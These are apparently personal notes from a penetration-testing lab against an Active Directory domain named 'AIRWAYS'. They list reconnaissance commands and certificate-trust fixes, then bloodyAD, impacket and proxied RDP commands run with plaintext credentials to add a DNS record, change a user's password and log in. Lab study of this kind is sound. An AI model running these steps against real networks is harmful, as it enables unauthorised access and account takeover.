# recon
```
# find internels
ip neigh

# check self 
ip -br addr
```
# Evidence check 
1. SSL cert error 
// for arch linux ssl path: /etc/ca-certificates/trust-source/anchors/
trust achor your_cert.pem
trust extract-compat
update-ca-trust


// for go cert path
export SSL_CERT_DIR=~/Downloads/

2. add dns record for avoid internal ip check
proxychains4 bloodyAD -H 192.168.100.1 -d AIRWAYS -u gabby.t -p 'behKRZudaZ0!' add dnsRecord zztest 10.10.17.159

# Basic 
// change password
proxychains4 changepasswd.py 'AIRWAYS/Isabel.O:ChangeTempP4ss123!@192.168.100.1' -newpass "zzChangeTempP4ss123!"
// smbclient
proxychains4 smbclient.py 'AIRWAYS/Isabel.O:zzChangeTempP4ss123!@192.168.100.1'
// rdp with proxy
xfreerdp3 /proxy:socks5://127.0.0.1:1080 /v:192.168.100.1:3389 /u:Isabel.O /d:AIRWAYS
